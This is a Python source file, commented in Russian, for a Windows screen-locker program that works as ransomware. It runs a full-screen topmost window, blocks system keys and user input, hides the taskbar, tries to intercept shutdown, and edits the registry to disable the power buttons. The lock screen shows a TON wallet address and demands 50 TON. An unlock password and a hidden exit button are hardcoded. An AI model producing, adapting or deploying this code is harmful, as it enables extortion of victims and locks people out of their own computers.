# -*- coding: utf-8 -*-
import sys
import subprocess
import importlib
import os
import ctypes
from ctypes import wintypes

# Устанавливаем необходимые библиотеки
required_libraries = ['tkinter', 'time']

def install_library(library):
    try:
        importlib.import_module(library)
        print(f"✓ {library} уже установлена")
    except ImportError:
        print(f"⏳ Устанавливаю {library}...")
        try:
            subprocess.check_call([sys.executable, "-m", "pip", "install", library])
            print(f"✓ {library} успешно установлена")
        except Exception as e:
            print(f"✗ Ошибка установки {library}: {e}")

print("🔧 Проверяем установленные библиотеки...")
for lib in required_libraries:
    install_library(lib)
print("✅ Все библиотеки установлены!")

# Импортируем после установки
import tkinter as tk
from tkinter import messagebox, font
import time

# Константы Windows
GWL_WNDPROC = -4
WM_QUERYENDSESSION = 0x0011
WM_ENDSESSION = 0x0016

# Загружаем системные библиотеки
user32 = ctypes.windll.user32
kernel32 = ctypes.windll.kernel32

class SystemBlocker:
    def __init__(self):
        self.original_wndproc = None
        self.setup_shutdown_block()
        
    def setup_shutdown_block(self):
        """Блокирует выключение и перезагрузку системы"""
        try:
            # Устанавливаем最高 приоритет для блокировки выключения
            kernel32.SetProcessShutdownParameters(0x4FF, 0)
            
            # Создаем невидимое окно для перехвата системных сообщений
            self.hwnd = user32.GetConsoleWindow()
            if self.hwnd:
                self.original_wndproc = user32.SetWindowLongPtrA(
                    self.hwnd, 
                    GWL_WNDPROC, 
                    ctypes.cast(self.window_proc, ctypes.c_void_p)
                )
        except Exception as e:
            print(f"Ошибка блокировки выключения: {e}")
    
    def window_proc(self, hwnd, msg, wparam, lparam):
        """Перехватываем системные сообщения о выключении"""
        if msg == WM_QUERYENDSESSION:
            # Блокируем запрос на завершение работы
            return 0
        elif msg == WM_ENDSESSION:
            # Блокируем завершение сеанса
            return 0
        
        # Для остальных сообщений вызываем оригинальный обработчик
        return user32.CallWindowProcA(self.original_wndproc, hwnd, msg, wparam, lparam)
    
    def disable_power_buttons(self):
        """Отключает кнопки питания"""
        try:
            # Отключаем кнопку питания через реестр
            subprocess.run([
                'reg', 'add', 
                'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer', 
                '/v', 'NoClose', '/t', 'REG_DWORD', '/d', '1', '/f'
            ], capture_output=True)
            
            # Отключаем меню выключения
            subprocess.run([
                'reg', 'add', 
                'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer', 
                '/v', 'NoStartMenuPowerButton', '/t', 'REG_DWORD', '/d', '1', '/f'
            ], capture_output=True)
        except:
            pass
    
    def enable_power_buttons(self):
        """Включает кнопки питания"""
        try:
            subprocess.run([
                'reg', 'delete', 
                'HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer', 
                '/v', 'NoClose', '/f'
            ], capture_output=True)
            
            subprocess.run([
                'reg', 'delete', 
                'HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer', 
                '/v', 'NoStartMenuPowerButton', '/f'
            ], capture_output=True)
        except:
            pass

class UltimateSystemLocker:
    def __init__(self):
        # Блокируем систему ДО создания окна
        self.system_blocker = SystemBlocker()
        self.system_blocker.disable_power_buttons()
        
        self.setup_window()
        self.create_widgets()
        self.setup_protection()
        
    def setup_window(self):
        """Создаем и настраиваем главное окно"""
        self.root = tk.Tk()
        self.root.title("")
        self.root.configure(bg='#000000')
        self.root.attributes('-fullscreen', True)
        self.root.attributes('-topmost', True)
        self.root.focus_force()
        
        # Запрещаем закрытие любыми способами
        self.root.protocol("WM_DELETE_WINDOW", self.do_nothing)
        self.root.bind('<Alt-F4>', lambda e: "break")
        
        # Скрываем курсор
        self.root.config(cursor='none')
        
    def setup_protection(self):
        """Настраиваем защиту"""
        # Блокируем все клавиши
        self.block_all_keys()
        
        # Скрываем панель задач
        self.hide_taskbar()
        
        # Блокируем ввод
        self.block_system_input()
        
        # Устанавливаем фокус
        self.root.after(100, self.force_focus)
        self.root.grab_set_global()
        
    def block_all_keys(self):
        """Блокируем все системные клавиши"""
        keys = [
            '<Alt_L>', '<Alt_R>', '<Win_L>', '<Win_R>', '<Control_L>', '<Control_R>',
            '<Escape>', '<F1>', '<F2>', '<F3>', '<F4>', '<F5>', '<F6>', '<F7>', '<F8>',
            '<F9>', '<F10>', '<F11>', '<F12>', '<Alt-Tab>', '<Control-Alt-Delete>',
            '<Control-Escape>', '<Menu>', '<Print>', '<Pause>', '<Scroll_Lock>', '<Insert>'
        ]
        for key in keys:
            self.root.bind(key, lambda e: "break")
    
    def hide_taskbar(self):
        """Скрываем панель задач"""
        try:
            taskbar = user32.FindWindowW("Shell_TrayWnd", None)
            if taskbar:
                user32.ShowWindow(taskbar, 0)
        except:
            pass
    
    def show_taskbar(self):
        """Показываем панель задач"""
        try:
            taskbar = user32.FindWindowW("Shell_TrayWnd", None)
            if taskbar:
                user32.ShowWindow(taskbar, 1)
        except:
            pass
    
    def block_system_input(self):
        """Блокируем системный ввод"""
        try:
            user32.BlockInput(True)
        except:
            pass
    
    def unblock_system_input(self):
        """Разблокируем системный ввод"""
        try:
            user32.BlockInput(False)
        except:
            pass
    
    def force_focus(self):
        """Принудительно устанавливаем фокус"""
        self.password_entry.focus_set()
        self.root.focus_force()
    
    def do_nothing(self):
        """Функция-заглушка для блокировки закрытия"""
        pass

    def create_widgets(self):
        """Создаем интерфейс"""
        main_frame = tk.Frame(self.root, bg='#000000')
        main_frame.place(relx=0.5, rely=0.5, anchor='center')
        
        # Предупреждение о блокировке
        warning_font = font.Font(family="Arial", size=16, weight="bold")
        warning = tk.Label(main_frame, 
                          text="🚫 SYSTEM BLOCKED 🚫\n"
                               "UQCq1hQ-LrutafKMhlGUZ5pa4wtCW6jpHkE3w2oDKswqIQ6M waiting for 50 TON ❗",
                          fg="#FF0000", bg='#000000', font=warning_font)
        warning.pack(pady=(0, 30))
        
        # Замок
        lock_font = font.Font(family="Arial", size=72)
        self.lock_label = tk.Label(main_frame, text="🔒", 
                                  fg="#FF0000", bg='#000000', font=lock_font)
        self.lock_label.pack(pady=(0, 30))
        
        # Инструкция
        instruction_font = font.Font(family="Arial", size=14)
        instruction = tk.Label(main_frame, 
                              text="Введите пароль для разблокировки системы:",
                              fg="#FFFFFF", bg='#000000', font=instruction_font)
        instruction.pack(pady=(0, 20))
        
        # Поле для ввода пароля
        self.password_entry = tk.Entry(main_frame, show="•", font=("Arial", 20), 
                                      width=20, bd=0, bg='#222222', fg='white', 
                                      insertbackground='white', justify='center',
                                      highlightthickness=3, highlightcolor='#FF0000')
        self.password_entry.pack(pady=(0, 25), ipady=10, ipadx=10)
        self.password_entry.bind('<Return>', lambda e: self.check_password())
        
        # Кнопка разблокировки
        button_font = font.Font(family="Arial", size=14, weight="bold")
        unlock_btn = tk.Button(main_frame, text="РАЗБЛОКИРОВАТЬ", 
                              command=self.check_password,
                              font=button_font, bg='#FF0000', fg='white',
                              bd=0, padx=30, pady=10)
        unlock_btn.pack(pady=(0, 20))
        
        # Секретный выход (левый верхний угол)
        self.secret_exit_btn = tk.Button(self.root, text="", 
                                        command=self.secret_exit,
                                        bg='#000000', fg='#000000',
                                        bd=0, width=3, height=1)
        self.secret_exit_btn.place(x=10, y=10)
        
        # Время
        time_font = font.Font(family="Arial", size=36, weight="bold")
        self.time_label = tk.Label(self.root, text="", 
                                  fg="#FFFFFF", bg='#000000', font=time_font)
        self.time_label.place(relx=0.5, rely=0.15, anchor="center")
        
        # Дата
        date_font = font.Font(family="Arial", size=16)
        self.date_label = tk.Label(self.root, text="", 
                                  fg="#CCCCCC", bg='#000000', font=date_font)
        self.date_label.place(relx=0.5, rely=0.22, anchor="center")
        
        # Запускаем обновления
        self.update_time_date()

    def update_time_date(self):
        """Обновляем время и дату"""
        current_time = time.strftime("%H:%M:%S")
        current_date = time.strftime("%d.%m.%Y")
        self.time_label.config(text=current_time)
        self.date_label.config(text=current_date)
        self.root.after(1000, self.update_time_date)

    def check_password(self):
        """Проверяем пароль"""
        if self.password_entry.get() == "1007":
            self.unlock_system()
        else:
            self.password_entry.delete(0, tk.END)
            self.password_entry.focus_set()

    def secret_exit(self):
        """Секретный выход"""
        self.secret_exit_btn.config(text="Удерживайте", fg='white', bg='#FF0000')
        self.root.after(5000, self.confirm_secret_exit)

    def confirm_secret_exit(self):
        """Подтверждение секретного выхода"""
        if self.secret_exit_btn.cget("text") == "Удерживайте":
            self.unlock_system()

    def unlock_system(self):
        """Разблокируем систему"""
        self.unblock_system_input()
        self.show_taskbar()
        self.system_blocker.enable_power_buttons()
        self.root.attributes('-topmost', False)
        self.root.grab_release()
        self.root.config(cursor='')
        self.root.destroy()

    def run(self):
        """Запускаем приложение"""
        try:
            self.root.mainloop()
        finally:
            # На всякий случай разблокируем систему
            self.unblock_system_input()
            self.show_taskbar()

if __name__ == "__main__":
    # Запускаем блокировку
    app = UltimateSystemLocker()
    app.run()